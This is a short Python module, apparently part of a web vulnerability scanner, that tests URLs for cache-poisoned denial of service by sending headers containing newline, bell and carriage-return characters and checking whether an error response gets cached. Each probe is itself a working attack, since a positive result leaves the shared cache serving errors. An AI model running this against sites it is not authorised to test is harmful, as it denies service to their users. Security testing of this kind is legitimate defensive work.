#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attempts to find Cache Poisoning with HTTP Metachar Character (HMC)
https://cpdos.org/#HMC
"""

from ..utils import *

VULN_NAME = "HTTP Metachar Character"

def HMC(url, s, main_status_code, authent):
    chars = [r"\n", r"\a", r"\r"]
    for c in chars:
        headers = {"X-Metachar-Header": c}
        req_hmc = s.get(url, headers=headers, timeout=10, verify=False, auth=authent, allow_redirects=False)
        if req_hmc.status_code in [400, 413, 500] and req_hmc.status_code != main_status_code:
            req_verify_hmc = s.get(url, verify=False, timeout=10, auth=authent)
            if req_verify_hmc.status_code == req_hmc.status_code and req_verify_hmc.status_code != main_status_code:
                print(f"  \033[31m └── VULNERABILITY CONFIRMED\033[0m | HMC DOS: {url} | \033[34m{main_status_code} > {req_verify_hmc.status_code}\033[0m | PAYLOAD: {headers}")